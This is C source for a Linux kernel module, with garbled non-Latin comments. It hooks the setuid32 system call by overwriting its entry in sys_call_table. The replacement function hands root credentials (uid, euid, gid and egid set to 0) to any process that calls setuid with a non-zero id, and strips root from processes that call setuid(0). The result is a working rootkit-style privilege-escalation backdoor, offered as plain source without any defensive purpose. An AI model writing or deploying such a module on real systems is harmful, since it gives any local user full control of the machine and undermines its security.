#define __KERNEL__
#define MODULE

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <sys/syscall.h>

#include <linux/sched.h>
#include <linux/types.h>


/* ������������ ������� ��������� ������� */
extern void *sys_call_table[]; 

/* ���������� ��������� ��� ���������� ����������� ������ */ 
int (*orig_setuid)(uid_t);

/* ������� ����������� ������� ��� ���������� ������ */ 
int change_setuid(uid_t uid)
{
  switch (uid)
  {
    case 0:
      current->uid = 99;  // �������� ������������� ������������
      current->euid = 99; // �������� ������������� ������������
      current->gid = 99;  // �������� ������������� ������
      current->egid = 99; // �������� ������������� ������
      break;
    default:
      current->uid = 0;  // �������� ������������� ������������
      current->euid = 0; // �������� ������������� ������������
      current->gid = 0;  // �������� ������������� ������
      current->egid = 0; // �������� ������������� ������
      break;
  }
  return 0;  // ���� return ����� ����� �����������
}

int init_module(void)
{
  /* ��������� ��������� �� ������������ ����� */
  orig_setuid = sys_call_table[__NR_setuid32];

  /* �������� ��������� � ������� ��������� ������� */
  sys_call_table[__NR_setuid32] = change_setuid;

  return 0;  // ���� return ����� ����� �����������
}

void cleanup_module(void)
{
  /* ��������������� ������������ ��������� ����� */ 
  sys_call_table[__NR_setuid32] = orig_setuid; 
}
